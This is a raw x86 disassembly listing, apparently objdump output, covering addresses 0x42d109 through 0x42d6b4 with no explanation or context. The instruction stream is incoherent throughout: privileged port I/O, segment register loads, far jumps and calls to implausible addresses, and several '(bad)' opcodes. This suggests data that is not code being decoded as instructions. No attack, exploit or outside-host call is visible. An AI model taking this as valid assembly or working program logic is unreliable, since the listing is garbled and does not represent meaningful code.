  42d109:	00 0c 02             	add    %cl,(%edx,%eax,1)
  42d10c:	f2 0c 89             	repnz or $0x89,%al
  42d10f:	6c                   	insb   (%dx),%es:(%edi)
  42d110:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42d111:	2d fa 88 01 07       	sub    $0x70188fa,%eax
  42d116:	f8                   	clc
  42d117:	b9 fc 5a ed 4f       	mov    $0x4fed5afc,%ecx
  42d11c:	b0 0d                	mov    $0xd,%al
  42d11e:	a2 fe 4d 0c 0f       	mov    %al,0xf0c4dfe
  42d123:	b6 c0                	mov    $0xc0,%dh
  42d125:	3d d3 ca 0e 92       	cmp    $0x920ecad3,%eax
  42d12a:	75 ba                	jne    0x42d0e6
  42d12c:	6f                   	outsl  %ds:(%esi),(%dx)
  42d12d:	4a                   	dec    %edx
  42d12e:	08 b9 32 c3 4c b4    	or     %bh,-0x4bb33cce(%ecx)
  42d134:	86 1a                	xchg   %bl,(%edx)
  42d136:	ae                   	scas   %es:(%edi),%al
  42d137:	25 07 f6 eb 74       	and    $0x74ebf607,%eax
  42d13c:	19 01                	sbb    %eax,(%ecx)
  42d13e:	d3 0d 76 e0 60 ec    	rorl   %cl,0xec60e076
  42d144:	7d 1a                	jge    0x42d160
  42d146:	6d                   	insl   (%dx),%es:(%edi)
  42d147:	9e                   	sahf
  42d148:	70 ec                	jo     0x42d136
  42d14a:	37                   	aaa
  42d14b:	1b cc                	sbb    %esp,%ecx
  42d14d:	0c 17                	or     $0x17,%al
  42d14f:	35 0a 15 2a 1a       	xor    $0x1a2a150a,%eax
  42d154:	8b 3b                	mov    (%ebx),%edi
  42d156:	60                   	pusha
  42d157:	3d 8e 02 e9 36       	cmp    $0x36e9028e,%eax
  42d15c:	eb e0                	jmp    0x42d13e
  42d15e:	2a 96 0c 73 e9 30    	sub    0x30e9730c(%esi),%dl
  42d164:	07                   	pop    %es
  42d165:	00 61 a8             	add    %ah,-0x58(%ecx)
  42d168:	2b d0                	sub    %eax,%edx
  42d16a:	9b                   	fwait
  42d16b:	e8 85 6b c1 e0       	call   0xe1043cf5
  42d170:	08 2b                	or     %ch,(%ebx)
  42d172:	01 83 c8 05 8f 1b    	add    %eax,0x1b8f05c8(%ebx)
  42d178:	a8 6d                	test   $0x6d,%al
  42d17a:	4a                   	dec    %edx
  42d17b:	89 83 74 14 8b 09    	mov    %eax,0x98b1474(%ebx)
  42d181:	68 22 ec d8 7e       	push   $0x7ed8ec22
  42d186:	0a 18                	or     (%eax),%bl
  42d188:	66 0b 66 6c          	or     0x6c(%esi),%sp
  42d18c:	6a 0a                	push   $0xa
  42d18e:	c8 18 2c 22          	enter  $0x2c18,$0x22
  42d192:	17                   	pop    %ss
  42d193:	22 db                	and    %bl,%bl
  42d195:	fd                   	std
  42d196:	d9 14 db             	fsts   (%ebx,%ebx,8)
  42d199:	10 3e                	adc    %bh,(%esi)
  42d19b:	e0 e2                	loopne 0x42d17f
  42d19d:	80 c4 19             	add    $0x19,%ah
  42d1a0:	93                   	xchg   %eax,%ebx
  42d1a1:	23 19                	and    (%ecx),%ebx
  42d1a3:	be 36 e1 16 d9       	mov    $0xd916e136,%esi
  42d1a8:	14 50                	adc    $0x50,%al
  42d1aa:	f6 1b                	negb   (%ebx)
  42d1ac:	32 91 81 0d 1c 21    	xor    0x211c0d81(%ecx),%dl
  42d1b2:	2e eb 59             	cs jmp 0x42d20e
  42d1b5:	46                   	inc    %esi
  42d1b6:	45                   	inc    %ebp
  42d1b7:	ec                   	in     (%dx),%al
  42d1b8:	58                   	pop    %eax
  42d1b9:	ab                   	stos   %eax,%es:(%edi)
  42d1ba:	15 78 70 01 fd       	adc    $0xfd017078,%eax
  42d1bf:	35 9c 0b a0 6e       	xor    $0x6ea00b9c,%eax
  42d1c4:	ad                   	lods   %ds:(%esi),%eax
  42d1c5:	9d                   	popf
  42d1c6:	5e                   	pop    %esi
  42d1c7:	64 78 66             	fs js  0x42d230
  42d1ca:	34 67                	xor    $0x67,%al
  42d1cc:	45                   	inc    %ebp
  42d1cd:	ee                   	out    %al,(%dx)
  42d1ce:	d9 5e 37             	fstps  0x37(%esi)
  42d1d1:	cc                   	int3
  42d1d2:	22 98 e8 5f 19 ff    	and    -0xe6a018(%eax),%bl
  42d1d8:	4e                   	dec    %esi
  42d1d9:	23 f3                	and    %ebx,%esi
  42d1db:	4d                   	dec    %ebp
  42d1dc:	9e                   	sahf
  42d1dd:	01 05 42 23 2f d8    	add    %eax,0xd82f2342
  42d1e3:	de 30                	fidivs (%eax)
  42d1e5:	da 4d 73             	fimull 0x73(%ebp)
  42d1e8:	ba d1 33 01 c4       	mov    $0xc40133d1,%edx
  42d1ed:	23 1a                	and    (%edx),%ebx
  42d1ef:	51                   	push   %ecx
  42d1f0:	71 68                	jno    0x42d25a
  42d1f2:	6e                   	outsb  %ds:(%esi),(%dx)
  42d1f3:	45                   	inc    %ebp
  42d1f4:	8e c9                	mov    %ecx,%cs
  42d1f6:	b7 d7                	mov    $0xd7,%bh
  42d1f8:	07                   	pop    %es
  42d1f9:	32 0f                	xor    (%edi),%cl
  42d1fb:	6e                   	outsb  %ds:(%esi),(%dx)
  42d1fc:	70 30                	jo     0x42d22e
  42d1fe:	1e                   	push   %ds
  42d1ff:	ac                   	lods   %ds:(%esi),%al
  42d200:	20 ba 18 6a 04 98    	and    %bh,-0x67fb95e8(%edx)
  42d206:	4d                   	dec    %ebp
  42d207:	fd                   	std
  42d208:	aa                   	stos   %al,%es:(%edi)
  42d209:	73 e1                	jae    0x42d1ec
  42d20b:	80 f5 07             	xor    $0x7,%ch
  42d20e:	32 dd                	xor    %ch,%bl
  42d210:	f7 01 aa 73 50 57    	testl  $0x575073aa,(%ecx)
  42d216:	ce                   	into
  42d217:	80 05 3c 0a 40 fa 87 	addb   $0x87,0xfa400a3c
  42d21e:	f3 99                	repz cltd
  42d220:	b4 1c                	mov    $0x1c,%ah
  42d222:	da 1a                	ficompl (%edx)
  42d224:	0c 8a                	or     $0x8a,%al
  42d226:	49                   	dec    %ecx
  42d227:	01 88 de da f6 66    	add    %ecx,0x66f6dade(%eax)
  42d22d:	85 07                	test   %eax,(%edi)
  42d22f:	40                   	inc    %eax
  42d230:	03 88 b4 8a 02 05    	add    0x5028ab4(%eax),%ecx
  42d236:	e8 80 7d b7 d1       	call   0xd1fa4fbb
  42d23b:	dc dd                	(bad)
  42d23d:	de 74 15 05          	fidivs 0x5(%ebp,%edx,1)
  42d241:	03 74 32 04          	add    0x4(%edx,%esi,1),%esi
  42d245:	13 1e                	adc    (%esi),%ebx
  42d247:	2f                   	das
  42d248:	21 f9                	and    %edi,%ecx
  42d24a:	7c 6e                	jl     0x42d2ba
  42d24c:	e9 91 04 6f 14       	jmp    0x14b1d6e2
  42d251:	dd fc                	(bad)
  42d253:	3a 13                	cmp    (%ebx),%dl
  42d255:	7d be                	jge    0x42d215
  42d257:	87 22                	xchg   %esp,(%edx)
  42d259:	72 01                	jb     0x42d25c
  42d25b:	8d be 23 b9 83 75    	lea    0x7583b923(%esi),%edi
  42d261:	e6 48                	out    %al,$0x48
  42d263:	63 de                	arpl   %ebx,%esi
  42d265:	fc                   	cld
  42d266:	0e                   	push   %cs
  42d267:	54                   	push   %esp
  42d268:	24 df                	and    $0xdf,%al
  42d26a:	89 20                	mov    %esp,(%eax)
  42d26c:	b9 2f 89 91 b8       	mov    $0xb891892f,%ecx
  42d271:	0b 72 33             	or     0x33(%edx),%esi
  42d274:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42d275:	80 24 01 d7          	andb   $0xd7,(%ecx,%eax,1)
  42d279:	05 4e 87 c0 19       	add    $0x19c0874e,%eax
  42d27e:	18 bc ff 38 c2 23 79 	sbb    %bh,0x7923c238(%edi,%edi,8)
  42d285:	b6 c2                	mov    $0xc2,%dh
  42d287:	75 74                	jne    0x42d2fd
  42d289:	ba 3f 18 49 d9       	mov    $0xd949183f,%edx
  42d28e:	36 8e 54 27 f4       	mov    %ss:-0xc(%edi,%eiz,1),%ss
  42d293:	05 29 03 d9 fc       	add    $0xfcd90329,%eax
  42d298:	92                   	xchg   %eax,%edx
  42d299:	23 db                	and    %ebx,%ebx
  42d29b:	46                   	inc    %esi
  42d29c:	01 05 9b f4 d8 fb    	add    %eax,0xfbd8f49b
  42d2a2:	76 60                	jbe    0x42d304
  42d2a4:	07                   	pop    %es
  42d2a5:	f6 74 2a 85          	divb   -0x7b(%edx,%ebp,1)
  42d2a9:	be 19 10 5c f1       	mov    $0xf15c1019,%esi
  42d2ae:	6c                   	insb   (%dx),%es:(%edi)
  42d2af:	98                   	cwtl
  42d2b0:	4d                   	dec    %ebp
  42d2b1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42d2b2:	16                   	push   %ss
  42d2b3:	3c 9d                	cmp    $0x9d,%al
  42d2b5:	00 f0                	add    %dh,%al
  42d2b7:	6f                   	outsl  %ds:(%esi),(%dx)
  42d2b8:	a9 39 26 6a 67       	test   $0x676a2639,%eax
  42d2bd:	8f 04 7c             	pop    (%esp,%edi,2)
  42d2c0:	66 90                	xchg   %ax,%ax
  42d2c2:	c1 0a 5b             	rorl   $0x5b,(%edx)
  42d2c5:	80 04 fa 45          	addb   $0x45,(%edx,%edi,8)
  42d2c9:	bd e1 c0 26 39       	mov    $0x3926c0e1,%ebp
  42d2ce:	56                   	push   %esi
  42d2cf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42d2d0:	16                   	push   %ss
  42d2d1:	3f                   	aas
  42d2d2:	4d                   	dec    %ebp
  42d2d3:	64 07                	fs pop %es
  42d2d5:	72 58                	jb     0x42d32f
  42d2d7:	8e 49 27             	mov    0x27(%ecx),%cs
  42d2da:	45                   	inc    %ebp
  42d2db:	c7                   	(bad)
  42d2dc:	21 17                	and    %edx,(%edi)
  42d2de:	d8 32                	fdivs  (%edx)
  42d2e0:	8b 1b                	mov    (%ebx),%ebx
  42d2e2:	eb 0e                	jmp    0x42d2f2
  42d2e4:	7c d6                	jl     0x42d2bc
  42d2e6:	e4 b2                	in     $0xb2,%al
  42d2e8:	17                   	pop    %ss
  42d2e9:	48                   	dec    %eax
  42d2ea:	77 51                	ja     0x42d33d
  42d2ec:	80 4d 43 f2          	orb    $0xf2,0x43(%ebp)
  42d2f0:	79 68                	jns    0x42d35a
  42d2f2:	79 1b                	jns    0x42d30f
  42d2f4:	0c 2d                	or     $0x2d,%al
  42d2f6:	fb                   	sti
  42d2f7:	ab                   	stos   %eax,%es:(%edi)
  42d2f8:	19 ad 70 78 c5 f7    	sbb    %ebp,-0x83a8790(%ebp)
  42d2fe:	ff                   	(bad)
  42d2ff:	fb                   	sti
  42d300:	28 2f                	sub    %ch,(%edi)
  42d302:	e4 80                	in     $0x80,%al
  42d304:	70 08                	jo     0x42d30e
  42d306:	9f                   	lahf
  42d307:	88 00                	mov    %al,(%eax)
  42d309:	e9 fa af e1 2b       	jmp    0x2c248308
  42d30e:	20 f7                	and    %dh,%bh
  42d310:	6a 55                	push   $0x55
  42d312:	2c 3f                	sub    $0x3f,%al
  42d314:	9b                   	fwait
  42d315:	75 bb                	jne    0x42d2d2
  42d317:	09 a4 43 04 01 1a 0f 	or     %esp,0xf1a0104(%ebx,%eax,2)
  42d31e:	0e                   	push   %cs
  42d31f:	5b                   	pop    %ebx
  42d320:	69 3a d8 66 04 f8    	imul   $0xf80466d8,(%edx),%edi
  42d326:	eb 52                	jmp    0x42d37a
  42d328:	7f d2                	jg     0x42d2fc
  42d32a:	ab                   	stos   %eax,%es:(%edi)
  42d32b:	f8                   	clc
  42d32c:	30 53 c9             	xor    %dl,-0x37(%ebx)
  42d32f:	bd 66 0d 05 00       	mov    $0x50d66,%ebp
  42d334:	1d 29 74 59 7f       	sbb    $0x7f597429,%eax
  42d339:	ff 8e 64 4a 10 2b    	decl   0x2b104a64(%esi)
  42d33f:	33 c9                	xor    %ecx,%ecx
  42d341:	3d ff 82 95 c1       	cmp    $0xc19582ff,%eax
  42d346:	8a 86 14 07 8b c1    	mov    -0x3e74f8ec(%esi),%al
  42d34c:	0e                   	push   %cs
  42d34d:	14 01                	adc    $0x1,%al
  42d34f:	f5                   	cmc
  42d350:	ba de a9 f1 37       	mov    $0x37f1a9de,%edx
  42d355:	8a 85 36 b8 02 e4    	mov    -0x1bfd47ca(%ebp),%al
  42d35b:	64 33 c7             	fs xor %edi,%eax
  42d35e:	1b f0                	sbb    %eax,%esi
  42d360:	fe 06                	incb   (%esi)
  42d362:	f8                   	clc
  42d363:	ec                   	in     (%dx),%al
  42d364:	83 8d 31 d9 30 c6 22 	orl    $0x22,-0x39cf26cf(%ebp)
  42d36b:	14 31                	adc    $0x31,%al
  42d36d:	d0 be 77 b6 92 00    	sarb   $1,0x92b677(%esi)
  42d373:	2a b5 38 30 6b c8    	sub    -0x3794cfc8(%ebp),%dh
  42d379:	ce                   	into
  42d37a:	66 42                	inc    %dx
  42d37c:	9f                   	lahf
  42d37d:	ff b5 2f 20 c5 48    	push   0x48c5202f(%ebp)
  42d383:	43                   	inc    %ebx
  42d384:	61                   	popa
  42d385:	b0 10                	mov    $0x10,%al
  42d387:	58                   	pop    %eax
  42d388:	5a                   	pop    %edx
  42d389:	09 6c 23 a2          	or     %ebp,-0x5e(%ebx,%eiz,1)
  42d38d:	71 5e                	jno    0x42d3ed
  42d38f:	70 d9                	jo     0x42d36a
  42d391:	4e                   	dec    %esi
  42d392:	46                   	inc    %esi
  42d393:	1e                   	push   %ds
  42d394:	dc 3e                	fdivrl (%esi)
  42d396:	14 3d                	adc    $0x3d,%al
  42d398:	72 fc                	jb     0x42d396
  42d39a:	63 93 41 07 bc f8    	arpl   %edx,-0x743f8bf(%ebx)
  42d3a0:	20 8b 05 05 76 74    	and    %cl,0x74760505(%ebx)
  42d3a6:	8b 13                	mov    (%ebx),%edx
  42d3a8:	0d 77 bb 9a ae       	or     $0xae9abb77,%eax
  42d3ad:	5f                   	pop    %edi
  42d3ae:	f8                   	clc
  42d3af:	4f                   	dec    %edi
  42d3b0:	f1                   	int1
  42d3b1:	08 74 a9 e8          	or     %dh,-0x18(%ecx,%ebp,4)
  42d3b5:	9c                   	pushf
  42d3b6:	f9                   	stc
  42d3b7:	44                   	inc    %esp
  42d3b8:	15 af 04 85 66       	adc    $0x668504af,%eax
  42d3bd:	3c ed                	cmp    $0xed,%al
  42d3bf:	90                   	nop
  42d3c0:	41                   	inc    %ecx
  42d3c1:	74 21                	je     0x42d3e4
  42d3c3:	09 b8 dc 07 21 34    	or     %edi,0x342107dc(%eax)
  42d3c9:	ac                   	lods   %ds:(%esi),%al
  42d3ca:	01 d0                	add    %edx,%eax
  42d3cc:	07                   	pop    %es
  42d3cd:	8c 8d 06 10 ed 54    	mov    %cs,0x54ed1006(%ebp)
  42d3d3:	f3 02 a6 83 97 db 56 	repz add 0x56db9783(%esi),%ah
  42d3da:	e8 d9 26 10 0b       	call   0xb52fab8
  42d3df:	a0 54 9e 0e 02       	mov    0x20e9e54,%al
  42d3e4:	06                   	push   %es
  42d3e5:	bd 14 61 f8 c8       	mov    $0xc8f86114,%ebp
  42d3ea:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42d3eb:	eb 7d                	jmp    0x42d46a
  42d3ed:	1b 81 17 f1 e4 0f    	sbb    0xfe4f117(%ecx),%eax
  42d3f3:	f8                   	clc
  42d3f4:	37                   	aaa
  42d3f5:	7a b5                	jp     0x42d3ac
  42d3f7:	3b e4                	cmp    %esp,%esp
  42d3f9:	02 5c 66 a1          	add    -0x5f(%esi,%eiz,2),%bl
  42d3fd:	0c 60                	or     $0x60,%al
  42d3ff:	83 14 a1 5f          	adcl   $0x5f,(%ecx,%eiz,4)
  42d403:	cc                   	int3
  42d404:	3e 45                	ds inc %ebp
  42d406:	e6 24                	out    %al,$0x24
  42d408:	85 a1 14 f3 c7 20    	test   %esp,0x20c7f314(%ecx)
  42d40e:	db 3b                	fstpt  (%ebx)
  42d410:	41                   	inc    %ecx
  42d411:	e5 0e                	in     $0xe,%eax
  42d413:	8c 32                	mov    %?,(%edx)
  42d415:	ea e0 24 f0 b0 23 71 	ljmp   $0x7123,$0xb0f024e0
  42d41c:	14 6a                	adc    $0x6a,%al
  42d41e:	74 0f                	je     0x42d42f
  42d420:	c0 67 23 6e          	shlb   $0x6e,0x23(%edi)
  42d424:	04 68                	add    $0x68,%al
  42d426:	07                   	pop    %es
  42d427:	a0 a5 84 6a 32       	mov    0x326a84a5,%al
  42d42c:	0b db                	or     %ebx,%ebx
  42d42e:	7c 83                	jl     0x42d3b3
  42d430:	f0 ce                	lock into
  42d432:	29 11                	sub    %edx,(%ecx)
  42d434:	e8 06 cf 94 a1       	call   0xa1d7a33f
  42d439:	11 cc                	adc    %ecx,%esp
  42d43b:	14 02                	adc    $0x2,%al
  42d43d:	50                   	push   %eax
  42d43e:	ec                   	in     (%dx),%al
  42d43f:	7d ae                	jge    0x42d3ef
  42d441:	3c e1                	cmp    $0xe1,%al
  42d443:	d3 c7                	rol    %cl,%edi
  42d445:	f0 28 e4             	lock sub %ah,%ah
  42d448:	36 f0 fd             	ss lock std
  42d44b:	13 19                	adc    (%ecx),%ebx
  42d44d:	9d                   	popf
  42d44e:	41                   	inc    %ecx
  42d44f:	9e                   	sahf
  42d450:	fc                   	cld
  42d451:	14 f4                	adc    $0xf4,%al
  42d453:	29 0f                	sub    %ecx,(%edi)
  42d455:	09 76 d0             	or     %esi,-0x30(%esi)
  42d458:	76 5c                	jbe    0x42d4b6
  42d45a:	4c                   	dec    %esp
  42d45b:	57                   	push   %edi
  42d45c:	d8 e8                	fsubr  %st(0),%st
  42d45e:	3d 29 4c c3 a1       	cmp    $0xa1c34c29,%eax
  42d463:	15 b7 a0 fd c1       	adc    $0xc1fda0b7,%eax
  42d468:	4f                   	dec    %edi
  42d469:	2e 50                	cs push %eax
  42d46b:	3b 2c 7f             	cmp    (%edi,%edi,2),%ebp
  42d46e:	31 ec                	xor    %ebp,%esp
  42d470:	fd                   	std
  42d471:	ec                   	in     (%dx),%al
  42d472:	fd                   	std
  42d473:	81 3f c3 33 06 d8    	cmpl   $0xd80633c3,(%edi)
  42d479:	05 16 0f 8d 12       	add    $0x128d0f16,%eax
  42d47e:	c1 7b 89 d9          	sarl   $0xd9,-0x77(%ebx)
  42d482:	19 7b 43             	sbb    %edi,0x43(%ebx)
  42d485:	8b 8d 8d fe 6c 91    	mov    -0x6e930173(%ebp),%ecx
  42d48b:	a8 f2                	test   $0xf2,%al
  42d48d:	46                   	inc    %esi
  42d48e:	3f                   	aas
  42d48f:	30 f8                	xor    %bh,%al
  42d491:	02 0f                	add    (%edi),%cl
  42d493:	85 0d 2c 98 bd 81    	test   %ecx,0x81bd982c
  42d499:	14 a0                	adc    $0xa0,%al
  42d49b:	b0 84                	mov    $0x84,%al
  42d49d:	05 af 12 a5 8f       	add    $0x8fa512af,%eax
  42d4a2:	90                   	nop
  42d4a3:	ea b0 25 c1 87 a2 98 	ljmp   $0x98a2,$0x87c125b0
  42d4aa:	87 26                	xchg   %esp,(%esi)
  42d4ac:	6b f5 a2             	imul   $0xffffffa2,%ebp,%esi
  42d4af:	26 2f                	es das
  42d4b1:	78 ba                	js     0x42d46d
  42d4b3:	26 b0 d9             	es mov $0xd9,%al
  42d4b6:	b2 50                	mov    $0x50,%dl
  42d4b8:	c3                   	ret
  42d4b9:	54                   	push   %esp
  42d4ba:	67 f4                	addr16 hlt
  42d4bc:	c1 92 5b 48 37 08 7b 	rcll   $0x7b,0x837485b(%edx)
  42d4c3:	9b                   	fwait
  42d4c4:	0d 86 64 ad 84       	or     $0x84ad6486,%eax
  42d4c9:	34 0c                	xor    $0xc,%al
  42d4cb:	7b df                	jnp    0x42d4ac
  42d4cd:	e2 f7                	loop   0x42d4c6
  42d4cf:	30 2c 38             	xor    %ch,(%eax,%edi,1)
  42d4d2:	6c                   	insb   (%dx),%es:(%edi)
  42d4d3:	9e                   	sahf
  42d4d4:	18 17                	sbb    %dl,(%edi)
  42d4d6:	94                   	xchg   %eax,%esp
  42d4d7:	3c df                	cmp    $0xdf,%al
  42d4d9:	32 0f                	xor    (%edi),%cl
  42d4db:	29 1c b5 da 00 cf 80 	sub    %ebx,-0x7f30ff26(,%esi,4)
  42d4e2:	6b e9 c8             	imul   $0xffffffc8,%ecx,%ebp
  42d4e5:	30 88 13 2a 09 66    	xor    %cl,0x66092a13(%eax)
  42d4eb:	32 5c 7f bf          	xor    -0x41(%edi,%edi,2),%bl
  42d4ef:	cc                   	int3
  42d4f0:	26 4f                	es dec %edi
  42d4f2:	77 bf                	ja     0x42d4b3
  42d4f4:	42                   	inc    %edx
  42d4f5:	38 72 e2             	cmp    %dh,-0x1e(%edx)
  42d4f8:	8b ba e8 46 53 98    	mov    -0x67acb918(%edx),%edi
  42d4fe:	7b 44                	jnp    0x42d544
  42d500:	7b d1                	jnp    0x42d4d3
  42d502:	ee                   	out    %al,(%dx)
  42d503:	bc e4 f2 b0 7b       	mov    $0x7bb0f2e4,%esp
  42d508:	51                   	push   %ecx
  42d509:	e2 59                	loop   0x42d564
  42d50b:	e6 27                	out    %al,$0x27
  42d50d:	03 79 4e             	add    0x4e(%ecx),%edi
  42d510:	9e                   	sahf
  42d511:	e8 f4 fc 29 0c       	call   0xc6cd20a
  42d516:	9a 11 93 31 19 a7 ee 	lcall  $0xeea7,$0x19319311
  42d51d:	4c                   	dec    %esp
  42d51e:	f6 73 55             	divb   0x55(%ebx)
  42d521:	13 34 7c             	adc    (%esp,%edi,2),%esi
  42d524:	42                   	inc    %edx
  42d525:	12 5e 75             	adc    0x75(%esi),%bl
  42d528:	b2 39                	mov    $0x39,%dl
  42d52a:	f6 60 0f             	mulb   0xf(%eax)
  42d52d:	68 44 7c 4f 50       	push   $0x504f7c44
  42d532:	7c d9                	jl     0x42d50d
  42d534:	e1 83                	loope  0x42d4b9
  42d536:	04 91                	add    $0x91,%al
  42d538:	03 e1                	add    %ecx,%esp
  42d53a:	e5 3d                	in     $0x3d,%eax
  42d53c:	20 bf 26 f1 96 4e    	and    %bh,0x4e96f126(%edi)
  42d542:	35 dd a2 c4 10       	xor    $0x10c4a2dd,%eax
  42d547:	68 1b 02 98 df       	push   $0xdf98021b
  42d54c:	94                   	xchg   %eax,%esp
  42d54d:	7d 59                	jge    0x42d5a8
  42d54f:	e0 b1                	loopne 0x42d502
  42d551:	28 0f                	sub    %cl,(%edi)
  42d553:	9d                   	popf
  42d554:	dd 3e                	fnstsw (%esi)
  42d556:	c1 d5 10             	rcl    $0x10,%ebp
  42d559:	40                   	inc    %eax
  42d55a:	31 ef                	xor    %ebp,%edi
  42d55c:	12 6e 58             	adc    0x58(%esi),%ch
  42d55f:	ca 05 d7             	lret   $0xd705
  42d562:	bd 45 b8 fa b9       	mov    $0xb9fab845,%ebp
  42d567:	63 34 42             	arpl   %esi,(%edx,%eax,2)
  42d56a:	0e                   	push   %cs
  42d56b:	24 0e                	and    $0xe,%al
  42d56d:	72 b9                	jb     0x42d528
  42d56f:	10 a5 45 20 b8 7d    	adc    %ah,0x7db82045(%ebp)
  42d575:	61                   	popa
  42d576:	e1 db                	loope  0x42d553
  42d578:	e6 5e                	out    %al,$0x5e
  42d57a:	58                   	pop    %eax
  42d57b:	98                   	cwtl
  42d57c:	ec                   	in     (%dx),%al
  42d57d:	68 c4 15 5e ec       	push   $0xec5e15c4
  42d582:	10 44 41 03          	adc    %al,0x3(%ecx,%eax,2)
  42d586:	fc                   	cld
  42d587:	23 e0                	and    %eax,%esp
  42d589:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  42d58c:	e8 a8 10 15 fc       	call   0xfc57e639
  42d591:	b6 9b                	mov    $0x9b,%dh
  42d593:	f9                   	stc
  42d594:	26 4a                	es dec %edx
  42d596:	11 5c 34 55          	adc    %ebx,0x55(%esp,%esi,1)
  42d59a:	e0 20                	loopne 0x42d5bc
  42d59c:	e8 ef 5b 68 de       	call   0xdeab3190
  42d5a1:	0e                   	push   %cs
  42d5a2:	f0 e8 87 c6 d5 01    	lock call 0x2189c2f
  42d5a8:	0b 8d 1a a7 a5 cd    	or     -0x325a58e6(%ebp),%ecx
  42d5ae:	61                   	popa
  42d5af:	27                   	daa
  42d5b0:	4e                   	dec    %esi
  42d5b1:	8b c8                	mov    %eax,%ecx
  42d5b3:	18 0f                	sbb    %cl,(%edi)
  42d5b5:	80 d6 e9             	adc    $0xe9,%dh
  42d5b8:	05 96 e8 e8 5e       	add    $0x5ee8e896,%eax
  42d5bd:	8c 3d 07 fc 9b dc    	mov    %?,0xdc9bfc07
  42d5c3:	32 63 e7             	xor    -0x19(%ebx),%ah
  42d5c6:	e8 f5 33 27 81       	call   0x816a09c0
  42d5cb:	d8 f1                	fdiv   %st(1),%st
  42d5cd:	b4 3d                	mov    $0x3d,%ah
  42d5cf:	47                   	inc    %edi
  42d5d0:	ec                   	in     (%dx),%al
  42d5d1:	05 4a 07 1f 0c       	add    $0xc1f074a,%eax
  42d5d6:	fe                   	(bad)
  42d5d7:	6e                   	outsb  %ds:(%esi),(%dx)
  42d5d8:	84 db                	test   %bl,%bl
  42d5da:	44                   	inc    %esp
  42d5db:	85 0b                	test   %ecx,(%ebx)
  42d5dd:	31 f5                	xor    %esi,%ebp
  42d5df:	8d b5 32 8b fc a5    	lea    -0x5a0374ce(%ebp),%esi
  42d5e5:	27                   	daa
  42d5e6:	47                   	inc    %edi
  42d5e7:	8e ed                	mov    %ebp,%gs
  42d5e9:	00 68 dc             	add    %ch,-0x24(%eax)
  42d5ec:	fe                   	(bad)
  42d5ed:	b4 f5                	mov    $0xf5,%ah
  42d5ef:	44                   	inc    %esp
  42d5f0:	61                   	popa
  42d5f1:	8d 19                	lea    (%ecx),%ebx
  42d5f3:	6c                   	insb   (%dx),%es:(%edi)
  42d5f4:	6c                   	insb   (%dx),%es:(%edi)
  42d5f5:	d7                   	xlat   %ds:(%ebx)
  42d5f6:	b0 f3                	mov    $0xf3,%al
  42d5f8:	97                   	xchg   %eax,%edi
  42d5f9:	f9                   	stc
  42d5fa:	0f 8d 02 0e fc 1c    	jge    0x1d3ee402
  42d600:	39 b6 ac 50 70 97    	cmp    %esi,-0x688faf54(%esi)
  42d606:	b6 0f                	mov    $0xf,%dh
  42d608:	b8 0e f7 6c f2       	mov    $0xf26cf70e,%eax
  42d60d:	8b 8d a0 f3 33 96    	mov    -0x69cc0c60(%ebp),%ecx
  42d613:	0f 90 5e 32          	seto   0x32(%esi)
  42d617:	c8 c8 d4 d4          	enter  $0xd4c8,$0xd4
  42d61b:	d4 66                	aam    $0x66
  42d61d:	06                   	push   %es
  42d61e:	60                   	pusha
  42d61f:	27                   	daa
  42d620:	cf                   	iret
  42d621:	56                   	push   %esi
  42d622:	6c                   	insb   (%dx),%es:(%edi)
  42d623:	94                   	xchg   %eax,%esp
  42d624:	8c 03                	mov    %es,(%ebx)
  42d626:	0e                   	push   %cs
  42d627:	32 61 c9             	xor    -0x37(%ecx),%ah
  42d62a:	de 8f 6c 4f 73 42    	fimuls 0x42734f6c(%edi)
  42d630:	87 7c ee 73          	xchg   %edi,0x73(%esi,%ebp,8)
  42d634:	ce                   	into
  42d635:	85 98 1e 76 9c 94    	test   %ebx,-0x6b6389e2(%eax)
  42d63b:	83 8c 8c 3c 1f d0 d0 	orl    $0xffffffd0,-0x2f2fe0c4(%esp,%ecx,4)
  42d642:	d0 
  42d643:	35 de e9 25 db       	xor    $0xdb25e9de,%eax
  42d648:	05 de 32 6a c0       	add    $0xc06a32de,%eax
  42d64d:	7c 40                	jl     0x42d68f
  42d64f:	8e fe                	mov    %esi,%?
  42d651:	e0 fd                	loopne 0x42d650
  42d653:	0c 83                	or     $0x83,%al
  42d655:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42d656:	90                   	nop
  42d657:	4c                   	dec    %esp
  42d658:	70 c6                	jo     0x42d620
  42d65a:	3a bb f2 06 c4 30    	cmp    0x30c406f2(%ebx),%bh
  42d660:	66 5f                	pop    %di
  42d662:	e4 f6                	in     $0xf6,%al
  42d664:	08 91 c0 f2 23 50    	or     %dl,0x5023f2c0(%ecx)
  42d66a:	45                   	inc    %ebp
  42d66b:	43                   	inc    %ebx
  42d66c:	8e 3c c0             	mov    (%eax,%eax,8),%?
  42d66f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42d670:	9c                   	pushf
  42d671:	0e                   	push   %cs
  42d672:	dd 0d b5 22 c1 6b    	fisttpll 0x6bc122b5
  42d678:	2a 38                	sub    (%eax),%bh
  42d67a:	6f                   	outsl  %ds:(%esi),(%dx)
  42d67b:	78 7a                	js     0x42d6f7
  42d67d:	d2 b5 ff 3d 49 3b    	shlb   %cl,0x3b493dff(%ebp)
  42d683:	c1 0f 83             	rorl   $0x83,(%edi)
  42d686:	89 1f                	mov    %ebx,(%edi)
  42d688:	69 bc b8 f2 f6 5c 5f 	imul   $0x80ebaf9,0x5f5cf6f2(%eax,%edi,4),%edi
  42d68f:	f9 ba 0e 08 
  42d693:	40                   	inc    %eax
  42d694:	bb 07 0d 88 8d       	mov    $0x8d880d07,%ebx
  42d699:	3d 76 3b 70 73       	cmp    $0x73703b76,%eax
  42d69e:	4d                   	dec    %ebp
  42d69f:	8b 7f 03             	mov    0x3(%edi),%edi
  42d6a2:	13 ee                	adc    %esi,%ebp
  42d6a4:	5f                   	pop    %edi
  42d6a5:	6b 96 78 00 10 12 3e 	imul   $0x3e,0x12100078(%esi),%edx
  42d6ac:	c6 84 05 f8 7e 52 af 	movb   $0xd,-0x50ad8108(%ebp,%eax,1)
  42d6b3:	0d 
  42d6b4:	ec                   	in     (%dx),%al
